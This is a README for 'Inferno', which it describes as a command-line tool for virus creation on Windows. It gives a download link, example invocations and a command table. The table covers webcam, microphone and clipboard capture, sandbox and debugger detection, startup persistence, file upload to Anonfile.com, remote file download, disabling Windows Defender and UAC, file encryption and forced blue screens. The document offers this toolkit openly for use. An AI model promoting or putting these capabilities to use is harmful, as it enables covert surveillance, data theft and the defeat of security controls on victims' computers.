# :fire: The Inferno:
Simple command line tool for virus creation. Written on C#

<p align="center">
  <img src="images/logo.png"/>
</p>

# :page_facing_up: Download:
* Download [Inferno.zip](https://raw.githubusercontent.com/LimerBoy/Inferno/master/bin/Inferno.zip) for windows.

# :diamonds: Examples:
* We can type Inferno commands it in command line:  
  ``` batch
  inferno.exe COMMAND "ARGUMENT1" "ARGUMENT2" "ARGUMENT3"
  ```
* Create web-cam screenshot:
  ``` batch
  inferno.exe WEBCAM_SCREENSHOT "screenshot.jpg" "4500" "1"
  ```
* Rotate monitor:
  ``` batch
  inferno.exe MONITOR_ROTATE "180"
  ```
  <p align="center">
    <img src="images/example2.gif"/>
  </p>
* Disable monitor:
  ``` batch
  inferno.exe MONITOR_OFF
  ```
  <p align="center">
    <img src="images/example3.gif"/>
  </p>
  
#  :mega: JSON output:
<p align="center">
  <img src="images/example.png"/>
</p>


# :book: Commands table:
| Command                           | Argument 1  | Argument 2  | Argument 3  | Description                       |
|:---------------------------------:|:-----------:|:-----------:|:-----------:|:---------------------------------:|
| CLIPBOARD_SET                     |    text     |    :x:      |     :x:     | Set text to clipboard             |
| CLIPBOARD_GET                     |    :x:      |    :x:      |     :x:     | Get text from clipboard           |
| DESKTOP_SCREENSHOT                |    filename |    :x:      |     :x:     | Create screenshot of desktop      |
| WEBCAM_SCREENSHOT                 |    filename |    delay    |     camera  | Create screenshot from webcamera  |
| MICROPHONE_RECORD                 |    filename |    seconds  |     :x:     | Record audio from microphone      |
| AUDIO_PLAY                        |    filename |    :x:      |     :x:     | Play .wav file                    |
| AUDIO_BEEP                        |    frequency|    duration |     :x:     | Make beep sound                   |
| BSOD                              |    :x:      |    :x:      |     :x:     | Make windows screen of death      |
| WALLPAPER                         |    filename |    :x:      |     :x:     | Set image as wallpaper            |
| GET_ACTIVE_WINDOW                 |    :x:      |    :x:      |     :x:     | Get title of active window        |
| GET_CURSOR_POSITION               |    :x:      |    :x:      |     :x:     | Get cursor position (x, y)        |
| SET_CURSOR_POSITION               |     X       |     Y       |     :x:     | Set cursor position (x, y)        |
| USER_IS_ACTIVE                    |    :x:      |    :x:      |     :x:     | Check if user is active           |
| STATUS_IN_SANDBOXIE               |    :x:      |    :x:      |     :x:     | Check if program in SandBoxie     |
| STATUS_IN_VIRTUALBOX              |    :x:      |    :x:      |     :x:     | Check if program in VirtualBox    |
| STATUS_IN_DEBUGGER                |    :x:      |    :x:      |     :x:     | Check if program in Debugger      |
| STATUS_IS_ADMIN                   |    :x:      |    :x:      |     :x:     | Check if program running as admin |
| MONITOR_ROTATE                    |    degrees  |    :x:      |     :x:     | Rotate all displays. Degrees can be only (0, 90, 180, 270) |
| MONITOR_OFF                       |    :x:      |    :x:      |     :x:     | Monitor off                       |
| MONITOR_ON                        |    :x:      |    :x:      |     :x:     | Monitor on                        |
| AUTORUN_INSTALL_TASKSCHEDULER     |    filename |    :x:      |     :x:     | Add file to startup. Method with TaskScheduler |
| AUTORUN_UNINSTALL_TASKSCHEDULER   |    filename |    :x:      |     :x:     | Remove file from startup. Method with TaskScheduler |
| AUTORUN_INSTALL_REGISTRY          |    filename |    :x:      |     :x:     | Add file to startup. Method with Registry |
| AUTORUN_UNINSTALL_REGISTRY        |    filename |    :x:      |     :x:     | Remove file from startup. Method with Registry |
| AUTORUN_INSTALL_SHELLSTARTUP      |    filename |    :x:      |     :x:     | Add file to startup. Method with startup directory |
| AUTORUN_UNINSTALL_SHELLSTARTUP    |    filename |    :x:      |     :x:     | Remove file from startup. Method with startup directory |
| NETWORK_DOWNLOAD_FILE             |    url      |    filename |     :x:     | Download file and save.     |
| NETWORK_UPLOAD_FILE               |    filename |    :x:      |     :x:     | Upload file to Anonfile.com |
| NETWORK_WHOIS                     |    ip       |    :x:      |     :x:     | Get ip information          |
| NETWORK_BSSIS_GET                 |    :x:      |    :x:      |     :x:     | Get router mac address      |
| NETWORK_BSSIS_INFO                |    bssid    |    :x:      |     :x:     | Get BSSID information       |
| NETWORK_PORT_IS_OPEN              |    ip       |    port     |     :x:     | Check if port is open       |
| BYPASS_DISABLE_DEFENDER           |    :x:      |    :x:      |     :x:     | Disable Windows Defender    |
| BYPASS_DISABLE_UAC                |    :x:      |    :x:      |     :x:     | Disable Windows UAC         |
| BYPASS_ENABLE_UAC                 |    :x:      |    :x:      |     :x:     | Enable  Windows UAC         |
| ADMIN_STARTFILE                   |    filename |    :x:      |     :x:     | Start file as admin         |
| FILE_ENCRYPT                      |    filename |    password |     :x:     | Encrypt file with key       |
| FILE_DECRYPT                      |    filename |    password |     :x:     | Decrypt file with key       |
| POWER_SHUTDOWN                    |    :x:      |    :x:      |     :x:     | Power off computer          |
| POWER_REBOOT                      |    :x:      |    :x:      |     :x:     | Restart computer            |
| POWER_HIBERNATE                   |    :x:      |    :x:      |     :x:     | Hibernate computer          |
| POWER_LOGOFF                      |    :x:      |    :x:      |     :x:     | Logoff computer             |
